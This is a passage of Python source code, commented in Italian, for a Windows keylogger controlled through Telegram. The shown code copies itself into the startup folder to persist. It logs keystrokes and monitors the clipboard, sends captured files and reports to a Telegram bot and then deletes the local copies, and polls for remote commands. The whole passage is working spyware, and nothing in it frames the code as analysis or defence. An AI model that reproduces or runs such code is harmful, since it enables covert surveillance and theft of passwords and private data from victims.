        dest_name = os.path.basename(sys.executable)
    else:
        source_path = os.path.abspath(__file__)
        dest_name = os.path.basename(source_path).replace(".py", ".pyw")
    dest_path = os.path.join(startup_folder, dest_name)
    try:
        if not os.path.exists(dest_path):
            print(f"[LOG] Copia di '{source_path}' in '{dest_path}'")
            shutil.copy2(source_path, dest_path)
        else:
            print("[LOG] Lo script/eseguibile è già nella cartella di avvio.")
    except Exception as e:
        print(f"[ERRORE] Impossibile aggiungere all\'avvio: {e}")





def send_and_delete(path, file_type, is_video=False):
    caption = f"{file_type} da `{MY_ID}`"
    print(f"[LOG] Tentativo di invio file: {path}")
    success = False
    if is_video:
        success = send_telegram_video(path, caption)
    else:
        success = send_telegram_document(path, caption)
    
    if success:
        try:
            os.remove(path)
            print(f"[LOG] File {path} inviato ed eliminato.")
        except Exception as e:
            print(f"[LOG] Errore durante l\'eliminazione del file {path}: {e}")
    else:
        print(f"[LOG] Invio file {path} fallito. Il file non sarà eliminato.")

# --- Blocco di Esecuzione ---
if __name__ == "__main__":
    # --- Controllo Istanza Singola (Mutex) ---
    if win32event:
        mutex_name = "GlobalKeyloggerTelegramMutex"
        mutex = win32event.CreateMutex(None, 1, mutex_name)
        if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
            print(f"[ERROR] Un\'altra istanza con il mutex '{mutex_name}' è già in esecuzione. Uscita.")
            sys.exit(0)
    # --- Fine Controllo Istanza Singola ---

    setup_device_id()
    send_telegram_message(f"✅ Dispositivo `{MY_ID}` avviato. Versione: `FIX_DEATH_LOOP_2`.")

    add_to_startup()

    # Avvia il listener della tastiera (non bloccante)
    keylogger_listener = keyboard.Listener(on_press=on_press_key, on_release=on_release_key)
    keylogger_listener.start()
    print("[LOG] Listener tastiera avviato.")

    # Avvia il monitoraggio degli appunti in un thread
    clipboard_thread = threading.Thread(target=monitor_clipboard)
    clipboard_thread.daemon = True
    clipboard_thread.start()
    print("[LOG] Thread monitoraggio clipboard avviato.")

    # Avvia il primo report, che poi si auto-schedula
    report()
    print("[LOG] Report periodico avviato.")

    # Avvia il polling dei comandi (bloccante)
    poll_commands()
    print("[LOG] Script terminato.")